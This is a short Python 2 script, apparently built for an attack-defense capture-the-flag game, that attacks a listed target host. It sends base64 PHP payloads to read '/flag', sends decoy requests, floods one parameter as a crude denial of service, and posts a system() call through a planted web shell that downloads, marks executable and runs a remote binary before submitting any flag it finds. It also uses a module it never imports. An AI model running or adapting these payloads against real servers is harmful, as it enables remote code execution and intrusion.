#-*- coding: utf-8 -*-

import requests
from setting import PATTERN,SUBMIT_URL

def submitflag(flag):
    requests.get(SUBMIT_URL+flag)

class Beating():
    def __init__(self,url):
        self.url = url
        self.sess = requests.session()

    def login(self):
        pass

    def obfs(self,url):
        print '[*]Obfsing '+self.url
        gets = ["/ctools_export_ui.class.php?token=highlight_file(%22/flag%22);","/authorize.php?batch=c3lzdGVtKCJjYXQgL2ZsYWciKTs=","/system.api.php?q=ZWNobyBmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKTs=","/view.php?file=print_r(file_get_contents(%22/flag%22));"]
        posts = [('/ctools_export_ui.class.php',{'ajax_html_ids':'c3lzdGVtKCJjYXQgL2ZsYWciKTs='}),('/statistics.php',{'nid':'cHJpbnRfcihmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKSk7'})]
        for g in gets:
            requests.get(url+g,timeout=2)
        for p in posts:
            requests.post(url+p[0],data=p[1],timeout=2)

    def DOS(self,url):
        print '[*]DOSing '+self.url
        requests.get(url+'/index.php?id='+'A'*0x1000,timeout=2)
    #huasir
    def attack(self):
        print '[*]Attacking '+self.url
        try:
            res = self.sess.post(self.url+'/.index.php',data={'0':'huasir','1':'system("cd /tmp&&wget -O xxx 127.0.0.1/check&&chmod +x xxx&&./xxx");'},timeout=3)
            res = re.findall(PATTERN,res.content)
            if len(res):
                # print self.url
                print res[0]
                submitflag(res[0])
        except Exception:
            pass

def B():
    targets = ['http://192.168.1.143']
    for tt in targets:
        BB = Beating(tt)
        BB.attack()

def main():
    B()

if __name__ == '__main__':
    main()